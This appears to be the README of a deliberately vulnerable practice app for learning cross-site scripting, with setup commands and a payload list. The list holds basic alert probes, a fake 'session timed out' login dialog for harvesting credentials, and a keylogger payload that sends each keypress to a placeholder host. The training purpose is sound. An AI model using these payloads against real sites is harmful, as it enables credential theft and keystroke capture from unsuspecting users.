# XSS Playground

A simple vulnerable web application to play around with XSS.

## Setup guide

Simply clone this repository and install the dependencies.

```
npm install
```

## Development

To run the web application in `dev` mode:

```
npm run dev
```

## Payloads

#### General

```html
<script>alert(1);</script>

<body onload='alert(1)'></body>

<img src=404 onerror='alert(1)' />

<iframe SRC='javascript:alert(1)'></iframe>
```

#### Fake login dialog form

```html
<dialog id='xss-dialog'>
	<h3>Your session has timed out. Please login again!</h3>
	<form method="dialog">
		<label for="username">Username:</label>
		<input id="username" name="username" type="text" />
		<br /> <br />
		<label for="password">Password:</label>
		<input id="password" name="password" type="password" />
		<br /> <br />
		<button type="submit">Login</button>
	</form>
</dialog>
<img src=x onerror="document.querySelector('#xss-dialog').showModal()"/>
```

#### Capture victim's keypress

```html
<img src=x onerror="
  document.addEventListener('keyup', (ev) => {
    fetch(`http://<hostname>:<port>/?key=${ev.key}`);
  });
" />
```
